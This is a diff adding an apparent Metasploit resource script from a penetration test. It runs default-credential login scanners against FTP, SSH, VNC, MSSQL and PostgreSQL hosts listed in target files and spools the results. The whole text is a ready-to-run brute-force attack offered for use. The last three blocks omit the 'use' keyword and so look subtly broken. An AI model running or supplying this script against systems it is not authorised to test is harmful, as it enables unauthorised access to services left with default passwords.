@@ -1,0 +1,39 @@
+use auxiliary/scanner/ftp/ftp_login
+set RHOSTS file:/home/ptest-2023/enumeration/targets_ftp.txt
+set BRUTEFORCE_SPEED 3
+set USERPASS_FILE /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt
+spool /home/ptest-2023/exploitation/ftp_login_out
+run
+spool off
+
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS file:/home/ptest-2023/enumeration/targets_ssh.txt
+set BRUTEFORCE_SPEED 3
+set USERPASS_FILE /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt
+spool /home/ptest-2023/exploitation/ssh_login_out
+run
+spool off
+
+auxiliary/scanner/vnc/vnc_login
+set RHOSTS file:/home/ptest-2023/enumeration/targets_vnc.txt
+set BRUTEFORCE_SPEED 3
+set USERPASS_FILE /usr/share/seclists/Passwords/Default-Credentials/vnc-betterdefaultpasslist.txt
+spool /home/ptest-2023/exploitation/vnc_login_out
+run
+spool off
+
+auxiliary/scanner/mssql/mssql_login
+set RHOSTS file:/home/ptest-2023/enumeration/targets_sqlserver.txt
+set BRUTEFORCE_SPEED 3
+set USERPASS_FILE /usr/share/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt
+spool /home/ptest-2023/exploitation/mssql_login_out
+run
+spool off
+
+auxiliary/scanner/postgres/postgres_login
+set RHOSTS file:/home/ptest-2023/enumeration/targets_postgresql.txt
+set BRUTEFORCE_SPEED 3
+set USERPASS_FILE /usr/share/seclists/Passwords/Default-Credentials/postgres-betterdefaultpasslist.txt
+spool /home/ptest-2023/exploitation/postgres_login_out
+run
+spool off
